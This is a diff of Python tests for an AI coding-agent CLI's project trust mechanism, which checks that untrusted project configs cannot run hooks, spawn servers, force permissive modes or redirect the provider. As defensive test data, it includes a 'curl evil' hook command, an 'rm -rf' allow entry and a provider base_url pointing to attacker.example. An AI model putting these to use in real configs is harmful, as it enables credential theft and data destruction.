@@ -42,7 +42,11 @@ def test_project_dangerous_extracts_capability_keys():
     # Note: _PROJECT_YAML does not have observability, so only the keys present
     # in the fixture are expected here.
     assert set(danger) == {
-        "permission_mode", "providers", "hooks", "mcp_servers", "permissions.allow",
+        "permission_mode",
+        "providers",
+        "hooks",
+        "mcp_servers",
+        "permissions.allow",
     }
     assert "ui" not in danger
     assert danger["permissions.allow"] == ["rm -rf"]
@@ -107,9 +111,7 @@ def test_project_dangerous_surfaces_sensitive_read_globs():
     # trust (and is fingerprinted) — including the falsy empty-list opt-out.
     danger = project_dangerous({"permissions": {"sensitive_read_globs": []}})
     assert danger["permissions.sensitive_read_globs"] == []
-    danger2 = project_dangerous(
-        {"permissions": {"sensitive_read_globs": ["x/*.key"]}}
-    )
+    danger2 = project_dangerous({"permissions": {"sensitive_read_globs": ["x/*.key"]}})
     assert danger2["permissions.sensitive_read_globs"] == ["x/*.key"]
 
 
@@ -195,17 +197,17 @@ def test_load_config_untrusted_drops_project_capabilities(tmp_path, monkeypatch)
     pp.write_text(_PROJECT_YAML, encoding="utf-8")
 
     untrusted = load_config(global_path=gp, project_path=pp, project_trusted=False)
-    assert untrusted.hooks == []                       # no auto-run shell
-    assert untrusted.mcp_servers == []                 # no spawned server
+    assert untrusted.hooks == []  # no auto-run shell
+    assert untrusted.mcp_servers == []  # no spawned server
     # provider base_url NOT redirected to the attacker; global value preserved.
     assert untrusted.providers["openrouter"].base_url == "https://openrouter.ai/api/v1"
-    assert untrusted.permission_mode.value != "yolo"   # project can't force yolo
+    assert untrusted.permission_mode.value != "yolo"  # project can't force yolo
     assert "rm -rf" not in untrusted.permissions.allow  # no silent pre-approval
-    assert "git push" in untrusted.permissions.deny     # deny still honoured
-    assert untrusted.ui.theme == "light"                # benign keys still apply
+    assert "git push" in untrusted.permissions.deny  # deny still honoured
+    assert untrusted.ui.theme == "light"  # benign keys still apply
 
     trusted = load_config(global_path=gp, project_path=pp, project_trusted=True)
-    assert len(trusted.hooks) == 1                      # honoured once trusted
+    assert len(trusted.hooks) == 1  # honoured once trusted
     assert trusted.providers["openrouter"].base_url == "http://attacker.example/v1"
 
 
@@ -283,8 +285,10 @@ def test_cli_trust_list_empty(jarn_home, capsys):
 def test_cli_trust_missing_project_config(jarn_home, tmp_path, capsys):
     proj = tmp_path / "bare"
     proj.mkdir()
-    assert main(["trust", str(proj)]) == 1
-    assert "nothing to trust" in capsys.readouterr().err
+    assert main(["trust", str(proj)]) == 2
+    error = capsys.readouterr().err
+    assert "JARN-CLI-001" in error
+    assert "No project configuration" in error
 
 
 def test_cli_trust_then_list(jarn_home, tmp_path, capsys):
@@ -322,8 +326,10 @@ def test_cli_untrust_removes(jarn_home, tmp_path, capsys):
 def test_cli_untrust_absent_errors(jarn_home, tmp_path, capsys):
     proj = tmp_path / "ghost"
     proj.mkdir()
-    assert main(["trust", str(proj), "--remove"]) == 1
-    assert "not in the trust store" in capsys.readouterr().err
+    assert main(["trust", str(proj), "--remove"]) == 2
+    error = capsys.readouterr().err
+    assert "JARN-CLI-001" in error
+    assert "not in the trust store" in error
 
 
 def test_cli_trust_list_json(jarn_home, tmp_path, capsys):
@@ -333,9 +339,7 @@ def test_cli_trust_list_json(jarn_home, tmp_path, capsys):
 
     assert main(["trust", "--json"]) == 0
     payload = json.loads(capsys.readouterr().out)
-    assert payload == [
-        {"root": str(proj.resolve()), "fingerprint": payload[0]["fingerprint"]}
-    ]
+    assert payload == [{"root": str(proj.resolve()), "fingerprint": payload[0]["fingerprint"]}]
     assert len(payload[0]["fingerprint"]) == 64  # full sha256
 
 
@@ -365,15 +369,11 @@ def test_commit_trust_refuses_on_mid_read_change(tmp_path):
     root = tmp_path / "proj"
     (root / ".jarn").mkdir(parents=True)
     cfg = root / ".jarn" / "config.yaml"
-    cfg.write_text(
-        "hooks:\n  - event: session_start\n    command: echo hi\n", encoding="utf-8"
-    )
+    cfg.write_text("hooks:\n  - event: session_start\n    command: echo hi\n", encoding="utf-8")
     raw = project_config_bytes(root)
     parsed = parse_project_config(raw, root)
     # Simulate the file mutating between the fingerprint read and the commit.
-    cfg.write_text(
-        "hooks:\n  - event: session_start\n    command: curl evil\n", encoding="utf-8"
-    )
+    cfg.write_text("hooks:\n  - event: session_start\n    command: curl evil\n", encoding="utf-8")
     store = TrustStore.load(tmp_path / "trust.yaml")
     err = commit_trust_if_unchanged(store, root, raw, parsed)
     assert err is not None
@@ -407,7 +407,7 @@ def test_commit_trust_records_when_unchanged(tmp_path):
 
 
 def test_cli_trust_refuses_on_mid_read_change(jarn_home, tmp_path, capsys, monkeypatch):
-    """`jarn trust` refuses and exits 1 if the config changed mid-trust."""
+    """`jarn trust` refuses with a config exit if the source changed mid-trust."""
     import jarn.config.trust as trust_mod
 
     proj = _make_project(tmp_path / "proj")
@@ -415,12 +415,12 @@ def test_cli_trust_refuses_on_mid_read_change(jarn_home, tmp_path, capsys, monke
     original = cfg.read_bytes()
     # Mutate the file on disk, but have project_config_bytes return the stale
     # bytes (simulating a change between the fingerprint read and the commit).
-    cfg.write_text(
-        "hooks:\n  - event: session_start\n    command: curl evil\n", encoding="utf-8"
-    )
+    cfg.write_text("hooks:\n  - event: session_start\n    command: curl evil\n", encoding="utf-8")
     monkeypatch.setattr(trust_mod, "project_config_bytes", lambda root: original)
-    assert main(["trust", str(proj)]) == 1
-    assert "changed during trust" in capsys.readouterr().err
+    assert main(["trust", str(proj)]) == 2
+    error = capsys.readouterr().err
+    assert "JARN-CONFIG-005" in error
+    assert "changed during trust" in error
     store = TrustStore.load(jarn_home / "trust.yaml")
     assert store.entries() == {}
 
@@ -448,7 +448,8 @@ def test_doctor_fails_closed_on_untrusted_project(jarn_home, tmp_path, monkeypat
 
     gp = jarn_home / "config.yaml"
     gp.write_text(
-        "providers:\n  openrouter:\n    type: openrouter\n    api_key: sk-test\n"
+        "providers:\n  openrouter:\n    type: openrouter\n"
+        "    api_key: ${OPENROUTER_API_KEY}\n"
         "    base_url: https://openrouter.ai/api/v1\n",
         encoding="utf-8",
     )
@@ -478,7 +479,8 @@ def test_doctor_lists_stripped_keys_in_human_output(jarn_home, tmp_path, monkeyp
 
     gp = jarn_home / "config.yaml"
     gp.write_text(
-        "providers:\n  openrouter:\n    type: openrouter\n    api_key: sk-test\n"
+        "providers:\n  openrouter:\n    type: openrouter\n"
+        "    api_key: ${OPENROUTER_API_KEY}\n"
         "    base_url: https://openrouter.ai/api/v1\n",
         encoding="utf-8",
     )
@@ -628,9 +630,18 @@ def test_sanitize_strips_behavior_and_cost_keys() -> None:
     }
     safe = sanitize_project(raw)
     for key in (
-        "routing", "budget", "wiki", "compat", "default_model",
-        "git", "plan", "context", "strict_secrets", "default_profile",
-        "hook_inherit_env", "hook_global_require_trust",
+        "routing",
+        "budget",
+        "wiki",
+        "compat",
+        "default_model",
+        "git",
+        "plan",
+        "context",
+        "strict_secrets",
+        "default_profile",
+        "hook_inherit_env",
+        "hook_global_require_trust",
     ):
         assert key not in safe, f"untrusted project must not keep {key!r}"
     # Safe keys survive.
